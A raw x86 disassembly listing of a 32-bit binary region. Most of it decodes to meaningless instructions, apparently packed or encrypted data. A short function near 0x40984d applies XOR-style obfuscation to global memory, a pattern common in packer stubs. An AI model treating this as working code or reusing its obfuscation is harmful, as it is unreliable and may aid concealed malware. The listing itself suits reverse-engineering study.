  40946c:	inc    eax
  40946d:	add    BYTE PTR [ebp+0xadfa4c3],ch
  409473:	loop   0x4094ba
  409475:	out    0xdb,eax
  409477:	(bad)  
  409478:	xchg   edx,eax
  409479:	sub    ecx,esp
  40947b:	es pop ecx
  40947d:	inc    ebp
  40947e:	jp     0x4094a2
  409480:	xor    BYTE PTR [edx-0x1e],dh
  409483:	aad    0x20
  409485:	cmp    eax,0x42651303
  40948a:	mov    al,ds:0xa496f131
  40948f:	jmp    0xb450:0xd51f8763
  409496:	inc    eax
  409497:	dec    edi
  409498:	fsub   DWORD PTR [ecx+0x7762eef7]
  40949e:	es cs ja 0x409447
  4094a2:	sbb    al,0xba
  4094a4:	pop    edx
  4094a5:	xchg   edi,eax
  4094a6:	mov    es,ebp
  4094a8:	mov    ch,0x60
  4094aa:	dec    eax
  4094ab:	cwde   
  4094ac:	int    0xe0
  4094ae:	(bad)  
  4094af:	(bad)  
  4094b0:	sbb    ecx,edi
  4094b2:	ds (bad) 
  4094b4:	out    0x9e,al
  4094b6:	or     al,0x4c
  4094b8:	adc    edx,esi
  4094ba:	inc    esp
  4094bb:	movups xmm2,xmm5
  4094be:	aad    0x42
  4094c0:	(bad)  
  4094c1:	adc    bl,BYTE PTR [ecx-0x68]
  4094c4:	mov    ds:0xfaa09275,al
  4094c9:	adc    al,0x7d
  4094cb:	je     0x58347e33
  4094d1:	xchg   cl,al
  4094d3:	xchg   ecx,eax
  4094d4:	jg     0x409536
  4094d6:	(bad)  
  4094d8:	pop    edi
  4094d9:	out    0xaa,al
  4094db:	je     0x409488
  4094dd:	fstp   QWORD PTR ds:0x67439df1
  4094e3:	add    dl,BYTE PTR [ebx+0x58]
  4094e6:	fild   WORD PTR [esi-0x48aa9e4a]
  4094ec:	mov    bh,0x5
  4094ee:	pop    ds
  4094ef:	sub    eax,0x53a8bfba
  4094f4:	mov    bl,0x16
  4094f6:	fnstcw WORD PTR [ebx-0x1e]
  4094f9:	sete   BYTE PTR [ebx+0x69d3c07b]
  409500:	dec    esp
  409501:	mov    ebp,0xcf1165c0
  409506:	enter  0x566d,0x3a
  40950a:	mov    ecx,0x77ab4100
  40950f:	mov    eax,ds:0x9a502736
  409514:	dec    esp
  409515:	mov    al,0xbb
  409517:	cmp    al,0x93
  409519:	(bad)  
  40951a:	out    dx,al
  40951b:	sub    eax,0x49c97fdd
  409520:	gs push ecx
  409522:	pop    esi
  409523:	repnz lock mov ds:0x16468d55,eax
  40952a:	jp     0x40958b
  40952c:	scas   al,BYTE PTR es:[edi]
  40952d:	ds call 0xc4c5:0xac407b0c
  409535:	cld    
  409536:	or     edx,DWORD PTR [eax+0x4ce2de9f]
  40953c:	in     eax,0x8f
  40953e:	pop    DWORD PTR ss:[edx+0x49]
  409542:	jp     0x409570
  409544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409545:	std    
  409546:	pop    ebp
  409547:	jmp    0xc26f:0x6a0bd8b5
  40954e:	mov    ah,0x1
  409550:	xchg   ebx,eax
  409551:	inc    esi
  409552:	and    BYTE PTR [edi+edi*1],bl
  409555:	xchg   BYTE PTR [ecx],dl
  409557:	pop    ecx
  409558:	out    dx,eax
  409559:	sti    
  40955a:	mov    bh,0x50
  40955c:	hlt    
  40955d:	div    BYTE PTR [ebx+0x43c1ddb6]
  409563:	push   ecx
  409564:	aas    
  409565:	mov    dh,0x2
  409567:	daa    
  409568:	add    eax,0x2cfade63
  40956d:	rcl    BYTE PTR [ecx+0x2c75bc4],1
  409573:	jp     0x4095c5
  409575:	mov    edx,0xd8daefe8
  40957a:	enter  0x96e6,0x3b
  40957e:	dec    edx
  40957f:	fbld   TBYTE PTR [esi]
  409581:	pop    es
  409582:	in     eax,dx
  409583:	stos   DWORD PTR es:[edi],eax
  409584:	or     al,0x64
  409586:	sbb    BYTE PTR [ebp-0x2d],0x6
  40958a:	and    al,0xa7
  40958c:	pushf  
  40958d:	jbe    0x4095b2
  40958f:	stos   BYTE PTR es:[edi],al
  409590:	rcr    DWORD PTR [ecx-0x2d],1
  409593:	dec    ecx
  409594:	bound  edx,QWORD PTR ds:0x2d4f75c9
  40959a:	inc    esi
  40959b:	add    BYTE PTR [eax],0x82
  40959e:	mov    ebp,0x92b0d644
  4095a3:	jnp    0x4095fc
  4095a5:	add    DWORD PTR [edx-0x5af8d332],0xffffffe8
  4095ac:	outs   dx,BYTE PTR ds:[esi]
  4095ad:	push   ecx
  4095ae:	mov    al,0xe3
  4095b0:	(bad)  
  4095b1:	lds    esi,FWORD PTR [ebx-0x25]
  4095b4:	ret    0xc094
  4095b7:	inc    DWORD PTR [ebx-0x1e]
  4095ba:	mov    cl,0xf9
  4095bc:	mov    ebx,0xb17b49c4
  4095c1:	jne    0x409608
  4095c3:	jae    0x4095f8
  4095c5:	and    eax,DWORD PTR [edx-0x1f]
  4095c8:	fs sbb eax,0x3cd0d685
  4095ce:	out    dx,al
  4095cf:	ss pop eax
  4095d1:	add    ah,BYTE PTR [edx-0x23]
  4095d4:	or     ecx,ecx
  4095d6:	xor    dh,0x45
  4095d9:	sub    ax,0x6409
  4095dd:	pop    edx
  4095de:	fdivr  st(6),st
  4095e0:	loop   0x40963d
  4095e2:	jecxz  0x4095af
  4095e4:	pop    ecx
  4095e5:	add    DWORD PTR [ebx-0x3e],esp
  4095e8:	jmp    0xd5617ed6
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e4a:0xfc99fa4e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	mov    edi,0x519d2775
  409611:	cwde   
  409612:	sbb    eax,0x78c498cc
  409617:	xchg   ecx,eax
  409618:	pusha  
  409619:	loope  0x409600
  40961b:	stos   BYTE PTR es:[edi],al
  40961c:	mov    ch,0x2a
  40961e:	cs iret 
  409620:	lods   eax,DWORD PTR ds:[esi]
  409621:	fldenv [esi]
  409623:	cmp    esi,DWORD PTR gs:[eax+esi*8-0xc84f05d]
  40962b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40962c:	(bad)  
  40962d:	out    0x97,eax
  40962f:	rcr    BYTE PTR fs:0x951402a1,cl
  409636:	mov    bl,BYTE PTR [ebx-0x6668bbc9]
  40963c:	or     edx,0xffffffbd
  40963f:	test   ah,dl
  409641:	cs mov bh,0xb1
  409644:	cmc    
  409645:	lea    eax,[edi-0x21080b59]
  40964b:	cdq    
  40964c:	xchg   ebx,eax
  40964d:	ins    BYTE PTR es:[edi],dx
  40964e:	(bad)  [eax+edi*1-0x48]
  409652:	test   ah,dl
  409654:	test   al,0x5b
  409656:	retf   0x9080
  409659:	sti    
  40965a:	mov    WORD PTR [ebp+0x30],ss
  40965d:	adc    esi,ecx
  40965f:	test   al,0x19
  409661:	loope  0x409661
  409663:	fstp   TBYTE PTR [edx+0x10]
  409666:	mov    cl,0x66
  409668:	jmp    0xe3549923
  40966d:	lods   eax,DWORD PTR ds:[esi]
  40966e:	fcomip st,st(1)
  409670:	cmp    al,0xd3
  409672:	cmp    esp,DWORD PTR [edi+edi*2+0x3c]
  409676:	fs lock add bh,dh
  40967a:	fisub  WORD PTR [edx+esi*8]
  40967d:	ds jb  0x4096bd
  409680:	in     al,dx
  409681:	(bad)  
  409682:	push   ds
  409683:	les    ebp,FWORD PTR [ebx+0x6b0457f9]
  409689:	lahf   
  40968a:	out    0xad,al
  40968c:	cwde   
  40968d:	push   ebx
  40968e:	icebp  
  40968f:	mov    dl,0x71
  409691:	adc    edi,DWORD PTR [ebp+0x16461ea9]
  409697:	dec    esp
  409698:	pop    ebp
  409699:	(bad)  
  40969a:	lds    ebp,FWORD PTR [ecx]
  40969c:	shl    BYTE PTR [edi+edi*8],cl
  40969f:	cmp    dh,cl
  4096a1:	mov    BYTE PTR [ecx+0x3a],dl
  4096a4:	js     0x409664
  4096a6:	ja     0x4096f6
  4096a8:	add    eax,0x59c693d3
  4096ad:	arpl   WORD PTR [ecx-0x37],dx
  4096b0:	pusha  
  4096b1:	xor    ah,al
  4096b3:	adc    edi,DWORD PTR [ebx]
  4096b5:	pop    esp
  4096b6:	jle    0x409648
  4096b8:	dec    edx
  4096b9:	sbb    al,0xf6
  4096bb:	xchg   ebp,eax
  4096bc:	adc    al,0x85
  4096be:	ins    BYTE PTR es:[edi],dx
  4096bf:	das    
  4096c0:	push   esp
  4096c1:	clc    
  4096c2:	and    eax,0x69e5b7be
  4096c7:	and    BYTE PTR [esi-0x3c945e05],cl
  4096cd:	ins    BYTE PTR es:[edi],dx
  4096ce:	cli    
  4096cf:	dec    esp
  4096d0:	or     DWORD PTR [ebx+0x451c9a4e],eax
  4096d6:	leave  
  4096d7:	sub    dl,BYTE PTR [edx+0x43678cb6]
  4096dd:	jae    0x40968e
  4096df:	repz and esp,DWORD PTR [eax+0x68]
  4096e3:	and    BYTE PTR [edx],0xb
  4096e6:	lock mul DWORD PTR [edi-0x5e5c4a01]
  4096ed:	pushf  
  4096ee:	and    eax,DWORD PTR [esi]
  4096f0:	jg     0x4096f2
  4096f2:	mov    edx,0xa095251c
  4096f7:	retf   0x1b3b
  4096fa:	arpl   WORD PTR [esi],cx
  4096fc:	cli    
  4096fd:	out    0x5b,eax
  4096ff:	popf   
  409700:	sub    eax,0x53171ca4
  409705:	in     al,0x80
  409707:	out    0x3,eax
  409709:	mov    esp,0xc940d03b
  40970e:	cmp    al,0x9c
  409710:	iret   
  409711:	cmp    BYTE PTR [edi-0x338168fe],bl
  409717:	pop    ds
  409718:	scas   eax,DWORD PTR es:[edi]
  409719:	retf   0x719e
  40971c:	gs int3 
  40971e:	adc    BYTE PTR [eax+0x54c1089],cl
  409724:	jns    0x4097a3
  409726:	sbb    eax,0x5403a1
  40972b:	xchg   edi,eax
  40972c:	out    dx,al
  40972d:	mov    dl,0xff
  40972f:	push   ecx
  409730:	xlat   BYTE PTR ds:[ebx]
  409731:	xchg   ecx,eax
  409732:	mov    esi,0x71806546
  409737:	lds    esi,FWORD PTR [ebx+0x5241424a]
  40973d:	pop    ebp
  40973e:	fist   WORD PTR [edi]
  409740:	out    0xe5,al
  409742:	and    BYTE PTR [edi-0x721fd95d],dh
  409748:	mov    ds:0x3e59b25d,al
  40974d:	push   ebp
  40974e:	xchg   ebx,eax
  40974f:	data16 jnp 0x409769
  409752:	inc    esp
  409753:	aas    
  409754:	imul   ebx,DWORD PTR [ecx],0x5bce6df4
  40975a:	ins    BYTE PTR es:[edi],dx
  40975b:	fdiv   DWORD PTR [esi]
  40975d:	adc    eax,0xdbcead57
  409762:	mov    BYTE PTR [ecx+0x197504b6],dh
  409768:	out    0x65,eax
  40976a:	call   0x5ff2:0x4e7bce74
  409771:	dec    ax
  409773:	mov    dh,0x41
  409775:	adc    DWORD PTR [esi],edi
  409777:	nop
  409778:	fs gs push edx
  40977b:	cmp    al,0x51
  40977d:	mov    eax,0xdaaad310
  409782:	mov    ebp,0xf76ca905
  409787:	rcl    BYTE PTR [ecx+0x9edcb33],0x28
  40978e:	add    ecx,esp
  409790:	jp     0x40971a
  409792:	cmp    eax,0xced53e16
  409797:	call   0x7f8:0x19e014db
  40979e:	aas    
  40979f:	std    
  4097a0:	mov    eax,0x52d984ac
  4097a5:	and    ecx,DWORD PTR [edi+0x36]
  4097a8:	dec    esi
  4097a9:	nop
  4097aa:	sbb    BYTE PTR [edi-0x1a],0x6e
  4097ae:	lods   al,BYTE PTR ds:[esi]
  4097af:	iret   
  4097b0:	nop
  4097b1:	dec    edi
  4097b2:	outs   dx,DWORD PTR ds:[esi]
  4097b3:	je     0x40975e
  4097b5:	jl     0x409823
  4097b7:	and    BYTE PTR [esi],0x8c
  4097ba:	dec    ebx
  4097bb:	daa    
  4097bc:	xor    ah,BYTE PTR [ebp+ebx*8-0x10]
  4097c0:	sub    eax,0x3406dd3f
  4097c5:	lock das 
  4097c7:	and    ebx,DWORD PTR [ebx+0x32]
  4097ca:	ins    DWORD PTR es:[edi],dx
  4097cb:	push   0xfffffff5
  4097cd:	sub    ch,BYTE PTR [ebx-0x5fc421a4]
  4097d3:	loope  0x4097ee
  4097d5:	mov    ah,BYTE PTR [esi-0x341bbe30]
  4097db:	(bad)  
  4097dc:	mov    edi,DWORD PTR [ecx-0x70f3c15d]
  4097e2:	bound  esp,QWORD PTR [esi+ecx*2+0x24809fa3]
  4097e9:	add    eax,DWORD PTR [eax]
  4097eb:	neg    BYTE PTR [esi]
  4097ed:	fcomp  QWORD PTR [ecx-0x5a6281b1]
  4097f3:	test   eax,0x60ee5ff3
  4097f8:	inc    edi
  4097f9:	pop    ss
  4097fa:	clc    
  4097fb:	cmp    DWORD PTR [esi+edx*8-0x2b],edi
  4097ff:	lods   al,BYTE PTR ds:[esi]
  409800:	loope  0x409791
  409802:	cmc    
  409803:	add    ebx,DWORD PTR [ebx+0x1d19cef0]
  409809:	cmp    DWORD PTR [edx+0x59],edi
  40980c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40980d:	pushf  
  40980e:	cmp    al,0xde
  409810:	add    ax,0xf5c
  409814:	sub    al,0x7
  409816:	add    eax,0x808ac6ee
  40981b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40981c:	adc    eax,0x4f14fa0c
  409821:	and    al,0x3d
  409823:	mov    al,ds:0xdbc5bc2e
  409828:	ret    0xc7c
  40982b:	nop
  40982c:	mov    edi,0x2b108912
  409831:	lahf   
  409832:	cmp    ax,WORD PTR [ebp+eiz*2+0x3bf4458b]
  40983a:	ret    
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	(bad)  
  4098c1:	imul   ebp,esp,0x6a
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	jg     0x4098ab
  4098ce:	cli    
  4098cf:	sbb    ch,BYTE PTR [esi+ecx*8-0x5f4c5805]
  4098d6:	push   ds
  4098d7:	pop    DWORD PTR [edi-0x6e]
  4098da:	fwait
  4098db:	xchg   ebx,eax
  4098dc:	and    BYTE PTR [esi+eiz*1+0x403448e9],cl
  4098e3:	mov    ds:0x39533401,eax
  4098e8:	test   al,0x6c
  4098ea:	loop   0x409914
  4098ec:	icebp  
  4098ed:	cli    
  4098ee:	addr16 fwait
  4098f0:	adc    ecx,ebp
  4098f2:	push   esi
  4098f3:	ret    0x6f95
  4098f6:	sti    
  4098f7:	jp     0x409933
  4098f9:	in     eax,dx
  4098fa:	outs   dx,DWORD PTR ds:[esi]
  4098fb:	shl    BYTE PTR [edx],1
  4098fd:	repnz scas eax,DWORD PTR es:[edi]
  4098ff:	mov    bh,0x15
  409901:	out    0x79,al
  409903:	inc    esp
  409904:	inc    ebp
  409905:	cs inc edx
  409907:	imul   eax,DWORD PTR [ecx-0x380797c0],0xffffffa9
  40990e:	pop    ss
  40990f:	or     eax,ebp
  409911:	sub    al,0x54
  409913:	test   DWORD PTR [eax+0x1c],0x5b834ef9
  40991a:	cmp    DWORD PTR [eax+0x38],esi
  40991d:	or     eax,0xba09aa31
  409922:	or     BYTE PTR [ecx-0x4ec6e8e2],ah
  409928:	pop    ss
  409929:	fs jne 0x409968
  40992c:	fild   DWORD PTR [edi+ebx*4+0xc]
  409930:	jmp    0x20fd0aad
  409935:	mov    esp,0x2e928bda
  40993a:	jae    0x4098fc
  40993c:	mov    al,ds:0xdbeecda
  409941:	lods   al,BYTE PTR ds:[esi]
  409942:	mov    ds:0xbcf5586e,al
  409947:	ret    0x7093
  40994a:	daa    
  40994b:	inc    esi
  40994c:	int    0xf3
  40994e:	or     eax,0xbb3947f5
  409953:	xchg   esi,eax
  409954:	scas   eax,DWORD PTR es:[edi]
  409955:	lahf   
  409956:	cdq    
  409957:	dec    eax
  409958:	pop    ebp
  409959:	jne    0x4098f1
  40995b:	icebp  
  40995c:	inc    esi
  40995d:	inc    edi
  40995e:	ds aas 
  409960:	xchg   ebp,eax
  409961:	int3   
  409962:	push   ds
  409963:	int3   
  409964:	push   ebp
  409965:	mov    ebp,0x2603d444
  40996a:	ins    BYTE PTR es:[edi],dx
  40996b:	lods   eax,DWORD PTR ds:[esi]
  40996c:	sar    BYTE PTR [ebx+0x525c5b3f],cl
  409972:	cdq    
  409973:	xchg   ecx,eax
  409974:	je     0x4099a3
  409976:	gs inc edx
  409978:	dec    ebx
  409979:	sub    cl,BYTE PTR [edi+0x1e]
  40997c:	mov    ds:0xe5d1ad53,al
  409981:	fiadd  WORD PTR [eax-0x42005792]
  409987:	rol    DWORD PTR [eax],cl
  409989:	jae    0x409938
  40998b:	enter  0x45a1,0x5e
  40998f:	(bad)  
  409990:	sbb    al,0x5c
  409992:	sbb    dh,BYTE PTR [ebx-0x30a29864]
  409998:	ret    
  409999:	js     0x409951
  40999b:	pop    ebp
  40999c:	inc    ebp
  40999d:	retf   
  40999e:	ins    BYTE PTR es:[edi],dx
  40999f:	pop    ds
  4099a0:	mov    dh,0xaa
  4099a2:	fbld   TBYTE PTR [ecx+esi*2]
  4099a5:	and    eax,0x712f9a5b
  4099aa:	push   es
  4099ab:	fwait
  4099ac:	inc    edi
  4099ad:	push   cs
  4099ae:	fwait
  4099af:	mov    ds:0x3f581a3b,al
  4099b4:	mov    bh,0x2b
  4099b7:	push   0x51c6901f
  4099bc:	dec    esp
  4099bd:	pop    esi
  4099be:	push   ebp
  4099bf:	mov    ebx,0xa0547cb7
  4099c4:	cmp    al,0xf4
  4099c6:	xchg   BYTE PTR [esi-0x6ffa5e61],bh
  4099cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099cd:	sub    esi,DWORD PTR [ebx+0x40b446c6]
  4099d3:	in     al,dx
  4099d4:	jg     0x4099b8
  4099d6:	cmp    al,0x67
  4099d8:	jl     0x409a31
  4099da:	mov    ebp,0x7a68e59f
  4099df:	stos   BYTE PTR es:[edi],al
  4099e0:	push   0xd3c53956
  4099e5:	push   esi
  4099e6:	xor    ebx,DWORD PTR [ebx-0x24]
  4099e9:	push   0xcedc553f
  4099ee:	fs out dx,eax
  4099f0:	mov    dl,0x43
  4099f2:	sbb    BYTE PTR [edi-0x30c19c0b],ah
  4099f8:	retf   
  4099f9:	or     al,0xb3
  4099fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099fc:	iret   
  4099fd:	aam    0x74
  4099ff:	(bad)  
  409a00:	dec    ebx
  409a01:	mov    ds:0x6a10650c,eax
  409a06:	jns    0x40998a
  409a08:	pop    ebp
  409a09:	dec    ebp
  409a0a:	cli    
  409a0b:	das    
  409a0c:	test   eax,0xd9ec66c3
  409a11:	or     BYTE PTR ds:0xa3c9d92d,ch
  409a17:	outs   dx,DWORD PTR ds:[esi]
  409a18:	adc    esi,DWORD PTR [ebx+ebp*8+0x64]
  409a1c:	push   ds
  409a1d:	mov    dh,bl
  409a1f:	xchg   edx,eax
  409a20:	mov    esi,0xc707f7bf
  409a25:	push   edx
  409a26:	ins    DWORD PTR es:[edi],dx
  409a27:	mov    bl,BYTE PTR [ebx-0x47b8dcf]
  409a2d:	jge    0x409a96
  409a2f:	int3   
  409a30:	mov    ds:0x269b3f5e,eax
  409a35:	cdq    
  409a36:	and    al,0x82
  409a38:	xlat   BYTE PTR ds:[ebx]
  409a39:	jl     0x409aba
  409a3b:	or     al,0xb0
  409a3d:	scas   al,BYTE PTR es:[edi]
  409a3e:	in     eax,0x7b
  409a40:	sbb    eax,0xbbc9a7dc
  409a45:	inc    DWORD PTR [edi-0x19]
  409a48:	mov    ch,0x17
  409a4a:	fs mov edi,0xa9d2567f
  409a50:	out    dx,eax
  409a51:	sbb    eax,0x820d32b8
  409a56:	ficomp WORD PTR [ebp-0x6]
  409a59:	sub    DWORD PTR [ecx-0x13670414],ebp
  409a5f:	in     eax,0x72
  409a61:	mul    BYTE PTR ds:0x7a135b96
  409a67:	or     eax,DWORD PTR [eax-0x78]
  409a6a:	test   al,0x93
  409a6c:	pop    edx
  409a6d:	in     eax,dx
  409a6e:	push   ebx
  409a6f:	addr16 push ss
  409a71:	data16 mov ds,WORD PTR ds:0x2b341674
  409a78:	jo     0x409a7b
  409a7a:	popf   
  409a7b:	add    eax,0x4acfbdde
  409a80:	mov    ?,WORD PTR [ebp-0xb32930]
  409a86:	dec    ecx
  409a87:	test   al,0x48
  409a89:	sub    eax,0xbb8075b
  409a8e:	addr16 jne 0x409ab3
  409a91:	enter  0xa846,0xe3
  409a95:	fidiv  WORD PTR [eax+0x25]
  409a98:	fsubr  st,st(5)
  409a9a:	inc    esp
  409a9b:	ins    BYTE PTR es:[edi],dx
  409a9c:	jnp    0x409b14
  409a9e:	cmp    al,0x77
  409aa0:	in     al,0xf2
  409aa2:	test   al,0xa7
  409aa4:	pop    esp
  409aa5:	or     BYTE PTR [esi+ebx*1-0x63],dh
  409aa9:	aaa    
  409aaa:	inc    BYTE PTR [edi-0x6b04525e]
  409ab0:	jle    0x409b25
  409ab2:	mov    bh,0x6e
  409ab4:	or     al,0x73
  409ab6:	sub    BYTE PTR [eax],0xeb
  409ab9:	(bad)  
  409aba:	fcmove st,st(7)
  409abc:	shr    DWORD PTR [edi+0x1a17f965],0x5f
  409ac3:	and    eax,0xaf2cd51c
  409ac8:	ret    0xd989
  409acb:	and    BYTE PTR [ebx-0x5bec96c5],0xfe
  409ad2:	sub    eax,0xad6893ba
  409ad7:	sahf   
  409ad8:	pop    ecx
  409ad9:	push   cs
  409ada:	jg     0x409b0d
  409adc:	dec    eax
  409add:	push   esi
  409ade:	jp     0x409a6e
  409ae0:	sbb    eax,0x3a0fc48b
  409ae5:	fbld   TBYTE PTR [ebx-0x75a29458]
  409aeb:	lea    ebp,[edi+edi*2-0x4d]
  409aef:	xchg   ebp,eax
  409af0:	icebp  
  409af1:	mov    al,0xac
  409af3:	cmp    DWORD PTR [ebp+0x6f78b833],ebp
  409af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409afa:	mov    al,ds:0x28b03e24
  409aff:	push   ss
  409b00:	mov    dh,0xa4
  409b02:	lea    ebx,[esp+ecx*4]
  409b05:	sbb    BYTE PTR [ebx],dl
  409b07:	out    dx,eax
  409b08:	mov    edi,0xb9a44d3b
  409b0d:	sti    
  409b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b0f:	mov    dh,0xa
  409b11:	out    0x56,eax
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43369f,0x433653
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x635769d4]
  409b32:	mov    bh,BYTE PTR [esi-0x1c]
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	dec    edx
  409b3c:	outs   dx,BYTE PTR ds:[esi]
  409b3d:	cmc    
  409b3e:	add    esp,DWORD PTR [edi+eiz*1+0x6a21f47d]
  409b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b46:	push   es
  409b47:	retf   
  409b48:	rol    BYTE PTR [edx-0x2f71882c],cl
  409b4e:	fcom   st(0)
  409b50:	xlat   BYTE PTR ds:[ebx]
  409b51:	retf   0x17a4
  409b54:	sbb    dl,BYTE PTR [eax+0x59e1d2f6]
  409b5a:	and    BYTE PTR [eax-0x1a42faa7],dl
  409b60:	jns    0x409b8a
  409b62:	out    0xf1,al
  409b64:	adc    eax,0xaddb4d49
  409b69:	mov    dl,0xb2
  409b6b:	fdivr  QWORD PTR [bx+si-0x34]
  409b6f:	xchg   dh,ch
  409b71:	shl    BYTE PTR [esi+0x447c1956],1
  409b77:	push   0x21
  409b79:	mov    BYTE PTR [esi+esi*2+0x730bc30f],dl
  409b80:	xchg   ebp,eax
  409b81:	mov    ds:0x3e11d421,eax
  409b86:	sub    al,0x0
  409b88:	sub    BYTE PTR [edx-0x40],ch
  409b8b:	enter  0xc1f8,0xdf
  409b8f:	fnop   
  409b91:	inc    esp
  409b92:	adc    cl,BYTE PTR gs:[esi-0x12785742]
  409b99:	sub    ah,al
  409b9b:	add    BYTE PTR [ecx+0x2327571b],ch
  409ba1:	movaps XMMWORD PTR [ecx],xmm4
  409ba4:	aaa    
  409ba5:	sti    
  409ba6:	dec    edx
  409ba7:	xor    BYTE PTR es:[esp+ecx*1],bl
  409bab:	and    DWORD PTR [eax+0x5],esp
  409bae:	inc    esi
  409baf:	push   0xcad5e2fb
  409bb4:	inc    ebx
  409bb5:	mov    BYTE PTR [esi-0x19],al
  409bb8:	in     al,0xd
  409bba:	sti    
  409bbb:	push   edx
  409bbc:	cmc    
  409bbd:	mov    dl,0x5b
  409bbf:	xchg   esi,eax
  409bc0:	sub    edx,DWORD PTR [ecx]
  409bc2:	cmp    ebp,DWORD PTR [ebp+0x59]
  409bc5:	test   DWORD PTR [esi+0x6d],eax
  409bc8:	mov    esp,0xfa6aa4ad
  409bcd:	dec    edi
  409bce:	lds    edi,FWORD PTR [ebx+0x70]
  409bd1:	(bad)  
  409bd2:	(bad)  
  409bd3:	xor    edx,DWORD PTR [ebp+0x77fd176f]
  409bd9:	test   eax,0xb855d26d
  409bde:	or     dl,dl
  409be0:	in     al,dx
  409be1:	retf   
  409be2:	ffreep st(6)
  409be4:	enter  0xaefc,0xd6
  409be8:	pop    esi
  409be9:	dec    ebp
  409bea:	data16 repnz daa 
  409bed:	sub    DWORD PTR [edx+0x1d],ebp
  409bf0:	int3   
  409bf1:	test   ah,dh
  409bf3:	xchg   ebx,eax
  409bf4:	cmp    DWORD PTR ds:0xd903805b,ebp
  409bfa:	mov    esp,0x97c09d4a
  409bff:	aam    0xa7
  409c01:	dec    edx
  409c02:	js     0x409bfb
  409c04:	jge    0x409b91
  409c06:	push   ebx
  409c07:	dec    edi
  409c08:	scas   al,BYTE PTR es:[edi]
  409c09:	dec    esp
  409c0a:	jge    0x409bfc
  409c0c:	inc    edx
  409c0d:	mov    eax,0xa941abed
  409c12:	fwait
  409c13:	mov    ?,WORD PTR [ebx]
  409c15:	or     ebx,0xffffff8c
  409c18:	sub    ah,BYTE PTR [ebp-0x67]
  409c1b:	shr    BYTE PTR [eax+0x46],0xaf
  409c1f:	or     al,0xbe
  409c21:	mov    ebp,0x7e139c28
  409c26:	pop    ecx
  409c27:	outs   dx,DWORD PTR ds:[esi]
  409c28:	jo     0x409bc8
  409c2a:	adc    esp,edi
  409c2c:	fsub   QWORD PTR [ebp+0x29]
  409c2f:	sub    eax,0xec69ead2
  409c34:	cld    
  409c35:	not    BYTE PTR [esi-0x3bf6e296]
  409c3b:	ss sahf 
  409c3d:	or     BYTE PTR [edi+eax*8+0x13416c9c],ah
  409c44:	xor    DWORD PTR [ebp+0x26ea69eb],esp
  409c4a:	sub    esp,DWORD PTR [esi+edi*8+0x2fc9d299]
  409c51:	inc    esi
  409c52:	push   es
  409c53:	xchg   ecx,eax
  409c54:	xchg   ebx,eax
  409c55:	dec    edi
  409c56:	and    al,0x43
  409c58:	test   BYTE PTR [esi+0x731ad8e7],cl
  409c5e:	pusha  
  409c5f:	inc    ebp
  409c60:	je     0x409c4b
  409c62:	xor    bh,bl
  409c64:	adc    eax,0x2d6ec302
  409c69:	mov    ecx,0x68918b05
  409c6e:	jg     0x409cb4
  409c70:	aam    0x2b
  409c72:	jb     0x409ca8
  409c74:	cmp    ecx,DWORD PTR [eax-0x1a904c1e]
  409c7a:	shl    DWORD PTR [eax-0x6da715b2],0xd7
  409c81:	cmp    eax,0x6a7fba98
  409c86:	pop    ebx
  409c87:	pop    ebx
  409c88:	in     al,0xa7
  409c8a:	adc    BYTE PTR [esi+0x429370b7],al
  409c90:	xchg   esi,eax
  409c91:	xor    edi,DWORD PTR [eax+0x5df334e3]
  409c97:	cli    
  409c98:	mov    eax,ds:0x17b69bfb
  409c9d:	out    0x67,eax
  409c9f:	jmp    0x24707a20
  409ca4:	daa    
  409ca5:	xchg   BYTE PTR [ebp+0x36],ah
  409ca8:	lea    edi,[esi-0x2e]
  409cab:	cmp    edi,DWORD PTR [eax+eiz*1]
  409cae:	mov    edi,0x9f7ead63
